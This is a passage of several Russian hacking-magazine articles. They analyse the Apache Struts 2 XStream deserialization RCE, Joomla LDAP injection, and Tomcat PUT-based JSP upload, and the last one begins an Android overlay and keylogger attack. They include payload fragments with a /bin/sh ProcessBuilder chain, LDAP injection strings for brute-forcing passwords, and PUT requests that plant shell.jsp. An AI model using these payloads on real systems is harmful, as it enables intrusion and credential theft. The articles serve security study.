выкину  несколь ко  необязательных  параметров  и  поп робую  отправить
методом POST. В качестве URL можно исполь зовать корень приложе ния,
который обрабаты вает REST API. В моем случае это http://struts.visual‐
hack:8080/struts2‐rest‐showcase/. В реальных условиях его, естествен‐
но, необ ходимо будет най ти. :)





         Успешная эксплу атация RCE‐уязвимости в Apache Struts 2

Сервер воз вра щает ошиб ку 500, и код успешно выполняется. Отмечу, что
уязвимы все типы зап росов, которые поддерживаются REST API, — PUT, GET,
POST и так далее.
  Во обще, сам пей лоад сгенерирован при помощи ути литы marshalsec.
С ней можно самыми разными спо собами про эксплуатировать классы
десери ализации (маршаллизации) и различные гаджеты к ним. В этом экс‐
пло ите исполь зовался класс XStream и ImageIO в качестве гаджета.





              Ге нерация пейлоада с помощью marshalsec

Техника эксплуатации с помощью сге нери рованного эксплоита использует
цепоч ку гаджетов java.util.Collections$EmptyIterator  →  javax.im‐
ageio.ImageIO$ContainsFilter.
 1. Ме тод hashCode() из класса jdk.nashorn.internal.objects.Native‐
   String вызывает NativeString‐>getStringValue().


   /src/jdk/nashorn/internal/objects/NativeString.java
   115: @Override
   116: public int hashCode() {
   117:     return getStringValue().hashCode();
   118: }

 2. getStringValue() вызывает java.lang.CharSequence‐>toString().
 3. Затем toString() из com.sun.xml.internal.bind.v2.runtime.unmar‐
   shaller.
   Base64Data вызывает Base64Data‐>get().


  42627.py
   28:                 <value class="com.sun.xml.internal.bind.v2.
   runtime.unmarshaller.Base64Data">
   29:                 <dataHandler>


   /com/sun/xml/internal/bind/v2/runtime/unmarshaller/Base64Data.-
   java
   67:     private DataHandler dataHandler;


   /com/sun/xml/internal/bind/v2/runtime/unmarshaller/Base64Data.-
   java
   177:    public byte[] More ...get() {
   178:        if (data == null) {
   179:            try {
   180:                ByteArrayOutputStreamEx baos = new ByteAr
   rayOutputStreamEx(1024);
   181:                InputStream is = dataHandler.getDataSource().
   getInputStream();

 4. Base64Data‐>get(), в свою очередь, запус кает read() из java.io.In‐
   putStream, пре доставленного javax.activation.DataSource. А там
   у нас com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlData‐
   Source, который мы определим далее в пейлоаде.


  42627.py
   30: <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMes
   sage$XmlDataSource">
   ...

 5. javax.crypto.CipherInputStream‐>read()  в  ито ге вызывает метод
   javax.crypto.Cipher‐>update().
 6. Что, в свою оче редь, приводит к вызову клас са FirstProvider, запус‐
  кающе го ите ратор, который мы ему переда дим. А передаем мы второй
   гаджет цепоч ки — javax.imageio.spi.FilterIterator.





                 Описание работы гаджета ImageIO


   35: <serviceIterator class="javax.imageio.spi.FilterIterator">
   36:     <iter class="javax.imageio.spi.FilterIterator">

 7. Полученный ите ратор выполняет метод next(), в котором про исходит
   вызов процедуры filter из FilterIterator$Filter.


   38: <next class="java.lang.ProcessBuilder">
   39: <command>
   40: <string>/bin/sh</string><string>‐c</string><string>'''+
   command +'''</string>
   41: </command>
   42: <redirectErrorStream>false</redirectErrorStream>
   43: </next>

 8. Это ведет к тому, что javax.imageio.ImageIO$ContainsFilter вызывает
   ука занный  метод   из  объекта,   который  был   передан   через
   FilterIterator.


   45: <filter class="javax.imageio.ImageIO$ContainsFilter">
   46:   <method>
   47:     <class>java.lang.ProcessBuilder</class>
   48:     <name>start</name>
   49:     <parameter‐types/>
   50:   </method>
   51:   <name>foo</name>
   52: </filter>

Таким  образом,   отра батывает   java.lang.ProcessBuilder‐>start()
с параметрами из <command>, который приводит к выполнению произволь‐
ного кода в системе. Довольно запутан но, да, но, изу чив пейлоад, ты пос‐
тепенно поймешь, как это работает.


Анализ патча
Те перь посмотрим на то, как раз работ чики исправили эту ошиб ку. Вот этот
ком мит фиксит уязвимость.





                  Патч, исправляющий уязвимость S2‐052

Мы можем видеть, что изменения коснулись обработчика XStreamHandler.
Ребята расширили его набор функций и добави ли белый список клас сов,
которые он может обрабатывать.


/src/plugins/rest/src/main/java/org/apache/struts2/rest/handler/XStr
eamHandler.java
047: public class XStreamHandler extends AbstractContentTypeHandler {
...
059:     public void toObject(ActionInvocation invocation, Reader in,
 Object target) {
060:         XStream xstream = createXStream(invocation);
...
073:     protected XStream createXStream(ActionInvocation invocation)
 {
074:         XStream stream = new XStream();
075:         LOG.debug("Clears existing permissions");
076:         stream.addPermission(NoTypePermission.NONE);
077:
078:         LOG.debug("Adds per action permissions");
079:         addPerActionPermission(invocation, stream);
080:
081:         LOG.debug("Adds default permissions");
082:         addDefaultPermissions(invocation, stream);
083:         return stream;
084:     }
...
086:     private void addPerActionPermission(ActionInvocation invoca
tion, XStream stream) {
087:         Object action = invocation.getAction();
088:         if (action instanceof AllowedClasses) {
...
104:     protected void addDefaultPermissions(ActionInvocation invoca
tion, XStream stream) {
...
109:         stream.addPermission(NullPermission.NULL);
110:         stream.addPermission(PrimitiveTypePermission.PRIMITIVES)
;
111:         stream.addPermission(ArrayTypePermission.ARRAYS);
112:         stream.addPermission(CollectionTypePermission.COLLEC
TIONS);
113:         stream.addPermission(new ExplicitTypePermission(new
Class[]{Date.class}));

Разуме ется, потенциаль но небезопасные клас сы туда не входят.


Де монстрация эксплу атации уяз вимости





Вы воды
Как это всег да бывает, наличие серьезных уязвимостей в популярных прог‐
рам мных про дуктах привлека ет к ним большое внимание, в том чис ле со сто‐
роны новых экспертов по безопас ности. Све жим взглядом они могут обна‐
ружить то, что ускользало от дру гих исследова телей. Так получи лось и с
фрей мворком Struts.
  Напоследок  хочу  сказать,  что  ути лита  marshalsec  была  написана
Морицем Бехлером (Moritz Bechler) на основе его фундаментального иссле‐
дования атак на алгорит мы десериализации и методов их экс плуата ции.
Всем, кто не читал, рекомендую обязательно ознакомиться.
ВЗЛОМ





                                                    aLLy
                                                 ONsec
                                                        @iamsecurity


     ОБХОДИМ АВТОРИЗАЦИЮ, ЧТОБЫ
    ПОЛУЧИТЬ ПАРОЛИ ПОЛЬЗОВАТЕЛЕЙ
            В JOOMLA CMS





По пулярнейшая многофун кциональная CMS Joomla снова
с нами. Несколько месяцев назад мы уже разбирали уяз‐
вимость в ней, но тогда это была SQL‐инъекция, а теперь
на повестке более экзо тическая штука — LDAP Injection. Уяз‐
вимости такого типа встречаются нечас то, тем более в сис‐
темах управления сай тами, но тем интереснее будет изучить
ее.


Уязвимость   называ ется   CVE‐2017‐14596,   и   найдена   она   была
аж 27 июля 2017 года. А нашел ее Йоханес Дасе из RIPS Technologies GmbH.
Уязвимы все версии CMS, начиная с 1.5.0 и закан чивая 3.7.5 включитель но.
То есть ошиб ка оставалась в коде необ наруженной в течение восьми лет,
до того как ее пофиксили 19 сентября 2017‐го.


Стенд
Как устанав ливать Joomla, я думаю, все в курсе. Что бы не париться с базовой
нас тройкой сервера, я слепил файл Docker, который ты можешь скачать
из моего репозитория. Пос ле его запуска тебе останет ся толь ко пройти
по шагам установки CMS.
   Те перь дело за LDAP. Мне совсем не хотелось разбираться с нас трой кой
сервера под Linux, поэтому я решил использовать OpenLDAP для Windows
и установить все это дело в три кли ка.
  После установки, если ты оставил все параметры по умол чанию, рек‐
визиты для коннекта будут следующими:


User: cn=Manager,dc=maxcrc,dc=com
Password: secret

Для управления сервером я вос пользуюсь утилитой LDAP Admin. По умол‐
чанию на сервере уже имеется предустановленный OU (organisation unit) Peo‐
ple. Туда я помещу нового пользователя.





              Созданный юзер в программе LDAP Admin

Почти все готово. Теперь вклю чаем в нас трой ках Joomla плагин авторизации
через LDAP.





                  Ак тивация плагина LDAP‐авториза ции

Затем переходим в настройки это го плагина и вбиваем наши данные.





                   Настройка LDAP‐авто риза ции

Об рати внимание на параметр Search String, его я взял из офи циальной
документации по настройке это го пла гина на сай те CMS.


Де тали уяз вимости
Пе реходим к изучению причин уяз вимости. Наш тернистый путь начинается
с класса LoginController.


/administrator/components/com_login/controller.php
17: class LoginController extends JControllerLegacy
...
48:     /**
49:      * Method to log in a user.
50:      *
51:      * @return  void
52:      */
53:     public function login()
54:     {
...
60:         $model = $this‐>getModel('login');
61:         $credentials = $model‐>getState('credentials');

Как видно из названия, он отвечает за процесс авторизации пользователей.
Данные поль зователей, переданные в форме логина, попадают в перемен‐
ную $credentials.
  После этого они передаются в метод login.


/administrator/components/com_login/controller.php
58:         $app = JFactory::getApplication();
...
64:         $result = $app‐>login($credentials, array('action' =>
'core.login.admin'));


/libraries/cms/application/cms.php
019: class JApplicationCms extends JApplicationWeb
...
859:    public function login($credentials, $options = array())
860:    {
861:        // Get the global JAuthentication object.
862:        $authenticate = JAuthentication::getInstance();
863:        $response = $authenticate‐>authenticate($credentials, $
options);

В про цессе обработ ки кредсов выполняется метод authenticate.
   Даль ше алго ритм работы зависит от активированных плагинов, которые
отве чают за авториза цию. Отрабаты вает метод onUserAuthenticate, и дан‐
ные уходят на обработ ку соответствующим плагинам.


/libraries/joomla/authentication/authentication.php
017: class JAuthentication extends JObject
...
253:    public function authenticate($credentials, $options = array()
)
254:    {
255:        // Get plugins
256:        $plugins = JPluginHelper::getPlugin('authentication');
...
268:        foreach ($plugins as $plugin)
269:        {
...
283:            // Try to authenticate
284:            $plugin‐>onUserAuthenticate($credentials, $options, $
response);

Так как у нас нас троена авто ризация через LDAP, то выполнение переходит
к классу PlgAuthenticationLdap.


/plugins/authentication/ldap/ldap.php
014: /**
015:  * LDAP Authentication Plugin
016:  *
017:  * @since  1.5
018:  */
019: class PlgAuthenticationLdap extends JPlugin
...
032:    public function onUserAuthenticate($credentials, $options, &$
response)
033:    {

В этом плагине имя пользователя попадает в зап рос к серверу LDAP, который
мы ука зывали как опцию search_string. Документация Joomla говорит
о том, что в стро ке зап роса темплейт [search] напрямую изме няется
на текст, переданный в поле login. Что ты и можешь наблюдать в сорцах.


/plugins/authentication/ldap/ldap.php
069:        switch ($auth_method)
070:        {
071:            case 'search':
072:            {
...
086:                    // Search for users DN
087:                    $binddata = $ldap‐>simple_search(str_replace(
'[search]', $credentials['username'], $this‐>params‐>get('search
_string')));

Мы ука зали uid=[search] в параметре Search String в настройках плагина,
так что пос ле замены полученная строка ухо дит в метод simple_search.


/libraries/vendor/joomla/ldap/src/LdapClient.php
016: class LdapClient
017: {
...
275:    public function simple_search($search)
276:    {
277:        $results = explode(';', $search);
278:
279:        foreach ($results as $key => $result)
280:        {
281:            $results[$key] = '(' . $result . ')';
282:        }
283:
284:        return $this‐>search($results);
285:    }

В качестве заключительного шага сгенерирован ная строка поис ка уходит
на LDAP‐сервер с помощью search.


/libraries/vendor/joomla/ldap/src/LdapClient.php
298:    public function search(array $filters, $dnoverride = null,
array $attributes = array())
299:    {
...
313:        foreach ($filters as $search_filter)
314:        {
315:            $search_result = @ldap_search($resource, $dn, $search
_filter, $attributes);

На данный момент у нас на руках LDAP‐инъекция. Так как никакой фильтрации
входных данных не происходит, мы можем вли ять на отправляемую на сервер
строку.
  Сер вер возвращает разные ответы в зависимос ти от резуль татов обра‐
бот ки запроса LDAP. Если пользователь най ден, то система будет отвечать,
что пароль неверен, а если пользователя вообще нет, то система известит
нас об этом в соот ветствующем сооб щении.





   Разные сообщения об ошиб ках в зависимос ти от переданных кредсов

Вызывать различные ошиб ки можно с помощью шаб лонов поиска.


PoC





Ис поль зуя асте риск  (*) и логические операторы, ты смо жешь вытащить
логины пользователей c их паролями из LDAP. Синтаксис логичес ких операто‐
ров в LDAP можешь пос мотреть в MSDN.
   Указываем в поле «Логин» формы авто риза ции строку ;uid=a*, а в качес‐
тве passwd — что угодно и отправляем запрос. Если поль зователь, логин
которого начинается с символа а, при сутствует в базе LDAP, то получаем
ошибку неверного пароля.
   Та ким образом мож но посим вольно переб рать сна чала имя пользователя,
а затем по ана логии и его пароль.
  Я накидал небольшой скрип тик на JS, который выпол няет всю работу. Все,
что нужно сделать, — это перейти на страницу авто ризации, выполнить его
и смот реть, как бегут буквы при перебо ре.
  Принцип работы скрипта прост: берутся по оче реди сим волы, указанные
в переменной charset, формируется и отправ ляет ся на сервер запрос
при помощи метода post из библиотеки jQuery. Если сервер воз вращает
ошибку о невоз можности найти пользователя, то очередь переходит к сле‐
дующе му символу из списка.
  После удачного под бора логина настает оче редь пароля. Символы
амперсанда экранируются системой, а зна чит, использовать условие «И»
у нас не выйдет. Поэтому воспользуем ся усло вием «ИЛИ».


;|(uid=none)(password=q*)

Тут мы нароч но делаем первую часть выражения логическим false (uid=none)
и пытаемся получить true от второй.
   Этот про цесс напомнил мне взлом паролей из фильмов двух тысяч ных.
Да и в ста рой доброй игре Uplink был похожий под ход.





          Сбру чен ный через LDAP‐инъекцию пароль от юзера


Вы вод
В целом это все, что я хотел тебе расска зать. Уязвимос ти такого плана редко
встре тишь в CMS, подоб ных Joomla. Однако это не повод списывать их
со сче тов. Круп ные и не очень компании любят все автоматизировать, и еди‐
ная авто ризация через LDAP попада ется доволь но‐таки часто.
   Также хотелось бы поделить ся ссылкой на небольшое ис следование,
которое было представлено на Black Hat, — в нем речь идет о разных LDAP‐
инъекциях. Хотя сам документ древний, идеи, озвученные в нем, до сих пор
актуальны. Если тебя интересует эта тема, то нас тоятельно рекомендую
к проч тению. И не стесняйся гуг лить «ldap injection»!
ВЗЛОМ





    ЭКСПЛУАТИРУЕМ КРИТИЧЕСКУЮ
    УЯЗВИМОСТЬ В APACHE TOMCAT





В  этой  статье мы  погово рим  о  баге
в Apache Tomcat, популярнейшем веб‐сер‐
вере для сайтов на Java. Баг поз воля ет заг‐
ружать любые файлы на сервер, так что,
заг рузив файл JSP, мож но добиться выпол‐                aLLy                                                                                    ONsec
нения про извольного  кода. Разберемся,              @iamsecurity
как работает эта уяз вимость.


ОБЩАЯ ИНФОРМАЦИЯ
Наряду с Apache Struts 2, уязвимость в котором мы разбирали в прошлой
статье, под раздачу багов попал и веб‐сервер Tomcat. За пос леднее время
было найдено сразу несколь ко уязвимостей.
   19 сентября команда разработчиков в очередной рассылке официально
под твердила наличие и успешный фикс двух уяз вимостей, которые получили
ста тус кри тических. Первая значится под номером CVE‐2017‐12615. Пос ле
того как ее запатчили, сразу же нашелся спо соб обойти заплатку (CVE‐2017‐
12616), и пос ледовал новый фикс. Не поверишь, но вскоре обошли и его —
уязвимость носит номер CVE‐2017‐12617, и ее общий смысл сводит ся к тому,
что неавторизи рованный поль зователь, манипулируя име нем файла в PUT‐
запросе, может создать JSP‐файл с произвольным содержимым. Уязвимости
под верже ны все ветки, начиная с 5.x и закан чивая 9.x.




                        Статья адресова на спе циалистам по безопас‐
                       ности и тем, кто собира ется ими  стать. Вся
                    информа ция   предос тавлена   исключительно
                        в ознакоми тельных целях. Ни редак ция, ни автор
                      не несут ответственности за любой возможный
                        вред, причинен ный материалами дан ной статьи.



СТЕНД
Сна чала, как водится, поднимаем тестовый стенд. Я буду использовать вер‐
сии Tomcat для Windows, так как CVE‐2017‐12615 и CVE‐2017‐12616 касаются
только их.
  Для провер ки уязвимостей мож но использовать любую из версий —
7.0.81, 8.5.20 или 9.0.0.M26. Все они уяз вимы.
   Также ты всегда можешь использовать Docker, благо у Apache есть офи‐
циальный репозиторий, из которого мож но поднять любую версию Tomcat
одной командой.


docker run ‐it ‐‐rm ‐p 8888:8080 tomcat:7.0.81

Те перь на пор те 8888 у тебя обитает выб ранная версия веб‐сер вера.
  После успешного запуска нужно отре дактировать конфигурационный файл
web.xml и добавить в него вот такие строки.


        <init‐param>
            <param‐name>readonly</param‐name>
            <param‐value>false</param‐value>
        </init‐param>

Они идут в этот раздел:


    <servlet>
        <servlet‐name>default</servlet‐name>

Таким образом мы выключаем параметр readonly, что поз воля ет исполь‐
зовать запросы PUT и DELETE. Но прос тое включение этой опции, конечно же,
не открывает нам воз можность записывать и уда лять JSP‐фай лы.





          Нельзя прос то так взять и заг рузить шелл через PUT


БАЗОВЫЕ ДЕТАЛИ УЯЗВИМОСТЕЙ
Для обра бот ки запросов к JSP и JSPX скрипты используют класс org.
apache.jasper.servlet.JspServlet.


/conf/web.xml
246:     <servlet>
247:         <servlet‐name>jsp</servlet‐name>
248:         <servlet‐class>org.apache.jasper.servlet.JspServlet</
servlet‐class>

А  за  обработ ку  остальных  фай лов  отвечает  org.apache.catalina.
servlets.DefaultServlet. Имен но в нем и реализован метод PUT.


/java/org/apache/catalina/servlets/DefaultServlet.java
539:     /**
540:      * Process a PUT request for the specified resource.
...
548:     @Override
549:     protected void doPut(HttpServletRequest req, HttpServletResp
onse resp)
550:         throws ServletException, IOException {
551:
552:         if (readOnly) {
553:             resp.sendError(HttpServletResponse.SC_FORBIDDEN);
554:             return;
555:         }

Как видишь, работа этого метода зависит от опции readOnly, которую мы
и выключили, так как по умолчанию она установлена в true.


/java/org/apache/catalina/servlets/DefaultServlet.java
162:     protected boolean readOnly = true;

Идея экспло ита заключается в том, что бы зас тавить PUT‐запрос к файлу JSP
обрабатываться с помощью DefaultServlet. Это можно про вернуть нес‐
колькими способа ми. Чтобы лучше вникнуть в детали, сначала мы поговорим
о методах, которые мож но использовать только в версиях для Windows.
  Давай запустим Tomcat версии 7.0.79 и выполним такой запрос:


PUT /read.txt%20 HTTP/1.1
Host: tomcat.visualhack:8080
Connection: close
Content‐Length: 3
any





          Зап рос на создание файла с про белом в конце имени

Ес ли ты знаешь про особен ности и ограниче ния в наз ваниях фай лов системы
Windows, то, увидев про бел в конце пути, сразу же все пой мешь. Дело в том,
что файлы, создава емые штатными методами ОС, не могут содержать про‐
белы в начале или в кон це имени — те прос то отбрасыва ются. Но ведь Tom‐
cat написан на Java, скажешь ты. Чтобы все прояснить, пос мотрим на клю‐
чевые шаги обработ ки нашего запроса.
  Ты уже знаешь, что за его обработ ку отве чает DefaultServlet. Если файл
еще не существует, то выполнение передается методу bind.


/java/org/apache/naming/resources/FileDirContext.java
466:     public void bind(String name, Object obj, Attributes attrs)
467:         throws NamingException {
...
471:         File file = new File(base, name);
...
476:         rebind(name, obj, attrs);

Запись данных в файл происходит в FileDirContext.rebind.


/java/org/apache/naming/resources/FileDirContext.java
21: import java.io.File;
22: import java.io.FileInputStream;
23: import java.io.FileOutputStream;
...
500:     public void rebind(String name, Object obj, Attributes attrs
)
...
506:         File file = new File(base, name);
...
533:         FileOutputStream os = null;
...
537:             os = new FileOutputStream(file);
538:             while (true) {
539:                 len = is.read(buffer);
540:                 if (len == ‐1)
541:                     break;
542:                 os.write(buffer, 0, len);
543:             }

Об рати внимание на класс java.io.FileOutputStream. Он открывает файл
для записи. Чтобы посмотреть, что про исходит в его недрах, нам придется
заглянуть в самое сер дце тьмы — в исходники Java.


/java/io/FileOutputStream.java
161:     public FileOutputStream(File file) throws FileNotFoundExc
eption {
162:         this(file, false);
163:     }
...
194:     public FileOutputStream(File file, boolean append)
...
197:         String name = (file != null ? file.getPath() : null);
198:         SecurityManager security = System.getSecurityManager();
...
213:         open(name, append);

Ме тод open объявлен как native и служит оберткой для вызова нативного
кода на C++. Для этих целей существу ет механизм Java Native Interface (JNI).


/java/io/FileOutputStream.java
259:     private native void open(String name, boolean append)


/windows/native/java/io/FileOutputStream_md.c
56: JNIEXPORT void JNICALL
57: Java_java_io_FileOutputStream_open(JNIEnv *env, jobject this,
58:                                    jstring path, jboolean append)
 {
59:     fileOpen(env, this, path, fos_fd,
60:              O_WRONLY | O_CREAT | (append ? O_APPEND : O_TRUNC));
61: }

Java Native Interface обращается к методу fileOpen, который, в свою оче‐
редь, передает управление winFileHandleOpen.


/windows/native/java/io/io_util_md.c
284: fileOpen(JNIEnv *env, jobject this, jstring path, jfieldID fid,
int flags)
285: {
286:     FD h = winFileHandleOpen(env, path, flags);
287:     if (h >= 0) {
288:         SET_FD(this, h, fid);
289:     }
290: }

Этот метод в конечном ито ге передает управле ние канонич ной функции Cre‐
ateFileW из WinAPI.


/windows/native/java/io/io_util_md.c
266:     h = CreateFileW(
267:         pathbuf,            /* Wide char path name */
268:         access,             /* Read and/or write permission */
269:         sharing,            /* File sharing flags */
270:         NULL,               /* Security attributes */
271:         disposition,        /* creation disposition */
272:         flagsAndAttributes, /* flags and attributes */
273:         NULL);

Из‐за такого поведе ния все сис темные ограничения на наз вание фай ла ста‐
новятся актуальными и для веб‐сервера. Таким обра зом, если мы отправ ляли
запрос на соз дание фай ла read.txt (с про белом в конце), то вместо этого
ОС отбрасывает пробелы и создает прос то read.txt. Это можно легко про‐
верить, используя, нап ример, такой скрипт на Python.


test.py
1: from ctypes import *
2: filename = 'read.txt '
3: windll.kernel32.CreateFileW (
4:   filename, 0x10000000, 0x2,
5:   None, 1, 0x80, None
6: )





          Функция CreateFileW и пробел в кон це имени файла

Или то же самое на Java.


test.java
1: import java.io.FileOutputStream;
2: public class test {
3:  public static void main(String [] args) throws Exception
4:  {
5:      FileOutputStream io = new FileOutputStream("D:/VisualHack/
read.txt ");
6:      io.close();
7:  }
8: }





                Функция CreateFileW и про бел в JVM

Ес ли этот фокус про вер нуть с фай лом JSP, результат будет такой же.
Веб‐сервер пар сит URI из запроса и направляет его в обработ чик Default‐
Server, а не JspServlet, потому что рас ширение запрашиваемого фай ла
вос при нимается как «jsp » (с пробелом). А уже внут ри метода, в процессе
создания фай ла, пробел отбрасывается, и мы получа ем работающий скрипт.


PUT /shell.jsp%20 HTTP/1.1
Host: tomcat.visualhack:8080
<% out.println(31337+1337); %>





               Успешное создание JSP‐файла через PUT

Абсолютно такая же проблема при обращении к альтернативным потокам
данных в NTFS (Alternate Data Streams, ADS).


PUT /shell.jsp::$DATA HTTP/1.1
Host: tomcat.visualhack:8080
<% out.println(31337+1337); %>

В новых версиях такой трюк уже не прокатит. Запустим Tomcat вер‐
сии 9.0.0.M27 и попробу ем отправить наш зап рос с пробелом.





         Фикс на исполь зование пробелов в кон це имени файла

Те перь сер вер возвращает ошибку и даже ука зыва ет «наличие пробела в кон‐
це имени файла» в качестве при чины. Поэто му самое время перейти к сле‐
дующе му разделу.


ОБХОД ФИКСОВ И АЛЬТЕРНАТИВНАЯ ВЕРСИЯ ЭКСПЛОИТА
Все воз можные пробелы и потоки — это, конечно, интерес но, однако хочется
чего‐то более уни версаль ного. Чего‐то, что работа ет незави симо от плат‐
формы и на пос ледних версиях веб‐сервера. И такой вари ант есть! Это слеш
в кон це имени фай ла.
  Но работа ет этот вектор по другим причинам. Рас смот рим их на при мере
уже запущенного Tomcat версии 9.0.0.M27. Теперь за обработку файла,
отправ ляемого через PUT‐запрос, отвечает отдель ный класс — WebResource.


/java/org/apache/catalina/servlets/DefaultServlet.java
550:     protected void doPut(HttpServletRequest req, HttpServletResp
onse resp)
...
560:         WebResource resource = resources.getResource(path);
...
578:             if (resources.write(path, resourceInputStream, true)
) {

Те перь управление перехо дит к методу write.


/java/org/apache/catalina/webresources/DirResourceSet.java
208:     public boolean write(String path, InputStream is, boolean
overwrite) {
...
220:         File dest = null;
...
223:             dest = file(path.substring(webAppMount.length()),
false);

Дальше в методе file соз дается экземпляр клас са File, на основе передан‐
ного в запросе пути.


/java/org/apache/catalina/webresources/AbstractFileResourceSet.ja-
va
54:     protected final File file(String name, boolean mustExist) {
...
59:         File file = new File(fileBase, name);

И мы снова телепор тируемся в исходни ки Java.


/share/classes/java/io/File.java
358:     public File(File parent, String child) {
...
362:         if (parent != null) {
363:             if (parent.path.equals("")) {
364:                 this.path = fs.resolve(fs.getDefaultParent(),
365:                                        fs.normalize(child));
366:             } else {
367:                 this.path = fs.resolve(parent.path,
368:                                        fs.normalize(child));
369:             }
370:         } else {
371:             this.path = fs.normalize(child);

В процессе инициализации File путь про ходит нормализа цию. Ее выполняет
метод normalize из класса FileSystem.


/java/io/File.java
149: public class File
...
156:     private static final FileSystem fs = DefaultFileSystem.
getFileSystem();

Он зависит от опе рационной сис темы, на которой выполняется. Для Windows
это   класс   WinNTFileSystem,   а   для   UNIX‐подобных   систем —
UnixFileSystem.


/windows/classes/java/io/DefaultFileSystem.java
37:     public static FileSystem getFileSystem() {
38:         return new WinNTFileSystem();
39:     }


/windows/instrument/FileSystemSupport_md.c
36: #define slash           '\\'
37: #define altSlash        '/'


/windows/classes/java/io/WinNTFileSystem.java
80:     @Override
81:     public String normalize(String path) {
82:         int n = path.length();
83:         char slash = this.slash;
84:         char altSlash = this.altSlash;
85:         char prev = 0;
86:         for (int i = 0; i < n; i++) {
87:             char c = path.charAt(i);
88:             if (c == altSlash)
89:                 return normalize(path, n, (prev == slash) ? i ‐ 1
 : i);

На Linux то же самое.


/java/io/UnixFileSystem.java
83:     public String normalize(String pathname) {
84:         int n = pathname.length();
85:         char prevChar = 0;
86:         for (int i = 0; i < n; i++) {
87:             char c = pathname.charAt(i);
...
92:         if (prevChar == '/') return normalize(pathname, n, n ‐ 1)
;

Ес ли при пар синге пути попада ется символ слеша (/), то он игнориру ется, и в
обработ ку ухо дит уже путь без него. Это можно легко про верить на практике,
наб росав неболь шой тестовый скрип тик.


slash.java
import java.io.File;
class slash {
    public static void main(String [] args) throws Exception
    {
        File b = new File("D:\\VisualHack\\Tomcat\\");
        File f = new File(b, "shell.jsp/");
        System.out.println(f.getPath());
    }
}





              Иг нориро вание сле ша в кон це имени фай ла

Те перь, когда мы в курсе происходящих процессов, отправляем запрос.


PUT /shell.jsp/ HTTP/1.1
Host: tomcat.visualhack:8080
<% out.println(31337+1337); %>

Скрипт соз дан и отлично выполняет ся. Мис сия выполнена! :‐)
  Конечно же, имеется нес колько готовых экс плоитов, которые автомати‐
зируют все рутин ные действия. Один из них ты най дешь в репозитории cyber‐
heartmi9.
  И если тебе интересно взглянуть на фикс, то вот коммит, который исправ‐
ляет эту уяз вимость.


ЭКСПЛУАТАЦИЯ УЯЗВИМОСТИ (ВИДЕО)





ВЫВОДЫ
Хоть проблема и выз вана небольшим про махом в реализации проверки поль‐
зовательских дан ных, потенциальный импакт от ее эксплуатации может быть
серьезным — вплоть до полной компрометации сис темы. Так что обновляй ся
вовремя!
ВЗЛОМ


                     ЭКСПЛУАТИРУЕМ
                      АТАКУ И СОЗДАЕМ
                 POC НАШУМЕВШЕЙ
    Андрей Пахомов
 mailforpahomov@gmail.com                      УЯЗВИМОСТИ





Читал новость? Да‐да, «новая уязвимость, которая пред‐
став ляет опас ность для всех устройств на базе Android,
вплоть до новейшей вер сии 7.1.2» и прочие страшные слова
и их ком бинации? Отлично, стало быть, проблема есть, а вот
исходников в публичном доступе пока не просматри вается.
А это значит, что в этой статье тебя ждет самый нас‐
тоящий 0day!


INSECURE BY-DESIGN?
Компания Google стре мится сделать Android под ходящим для любых задач,
наделяя платформу самыми раз ными фун кци ями. Иногда это может выйти
боком — так в этот раз и произошло. Груп па товарищей из США в мае
текуще го года пуб лично презентовала новый вид атак на Android под име нем
Cloak and Dagger.
  Иссле дователи внимательно прос мотрели стандар тный SDK раз работчика
и смогли реализовать не совсем то, что задумы вала компания Google. По их
словам, получив всего два разрешения в системе (одно из которых не тре‐
бует подтвержде ния от пользовате ля, а вто рое мож но получить скрытно
с помощью первого), при ложение сможет сде лать практически все, что
захочет.
   Атака выш ла впе чатляющей, сами исследователи предложили с десяток
воз можных вариантов — от создания фей ковых окон популярных приложений
до кражи паролей. По сле дам презентации ты мог видеть не только нашу
статью, но и отчет Касперского — в них достаточно красок и эмоций.




                  Ма тери ал адpесован специалистам по безопас‐
                       ности и тем, кто собираeтся ими  стать. Вся
                    информа ция   предос тавлена   исключительно
                        в ознакоми тельных целях. Ни редак ция, ни автор
                      не несут ответственности за любой возможный
                        вред, причинен ный материалами дан ной статьи.



SHOW ME THE CODE
Авторы под робно рас сказали о сути происходяще го, но не показали самого
интерес ного — исходников приложения, реали зующе го такие ата ки. А когда
при ходится верить людям на сло во, сразу возника ют подозрения в достовер‐
ности сказанного — может, сама атака не такая уж и серьезная или вообще
неосуществима?
   Чтобы развеять твои (да и свои собственные) сомнения, я решил протес‐
тировать основные воз можнос ти, которые описали исследователи: прод‐
винутый кейлог гер, фишинговые окна и «подталки вание» пользовате лей
к нажатию нужных клавиш.
   Тут не придется, как в уязвимос ти Stagefright, перепол нять буфер
и генерировать payload — все дос тупно в стан дартном API. Будем поль‐
зоваться толь ко разрешением SYSTEM_ALERT_WINDOW и сервисом спе‐
циальных воз можностей Accessibility service.


SYSTEM_ALERT_WINDOW
Как ты, навер ное, знаешь, в Android все при ложе ния работают внут ри песоч‐
ниц. Это позволяет разработчику быть уверенным, что к данным его приложе‐
ния ник то не получит доступ со стороны, — конеч но, если сам пользователь
еще не организовал root‐доступ к устройству.
  Для ата ки Cloak and Dagger использует ся одно малознакомое поль зовате‐
лям  разрешение — SYSTEM_ALERT_WINDOW. Оно  поз воляет  вывести
на экран так называемое системное окно: View‐элемент, который отоб разит‐
ся поверх любого другого UI, даже если это будет Activity из стороннего при‐
ложения. При этом перекрытые  Activity об этом не узнают и про дол жат
работать так, как будто ничего и не произошло.
  В документации Google называет это раз решение спе циальным и нас‐
тоятельно не рекомендует им пользоваться. Впро чем, не все так щепетиль‐
ны — Facebook с помощью его выводит уве домления о новых сообщениях.
  Но самое инте рес ное, что это разрешение даже не надо под тверждать, —
любое установленное из Google Play приложение может соз давать сис‐
темные окна, если разрешение SYSTEM_ALERT_WINDOW заявлено в его
манифес те.





                       Установка из Google Play


СОЗДАЕМ СИСТЕМНОЕ ОКНО
Как ты уже понял, системное окно — это очень кру то. С его помощью можно
вывести дан ные поверх вооб ще любого элемента  Android, даже если
это будет окно системных настроек или телефон ный звонок.





             Пе рекрываем системным окном голосо вой
               зво нок

Что бы вывести такое окно, понадобит ся класс WindowManager — системный
сервис, отвечающий за стек всех View‐элемен тов, которые отображены
на экра не. Под клю читься к нему, как и любому дру гому сис темному сервису,
можно совершенно свобод но с помощью метода getSystemService.


WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);

Для вывода окна нуж но задать параметры будуще го UI, сис темным оно ста‐
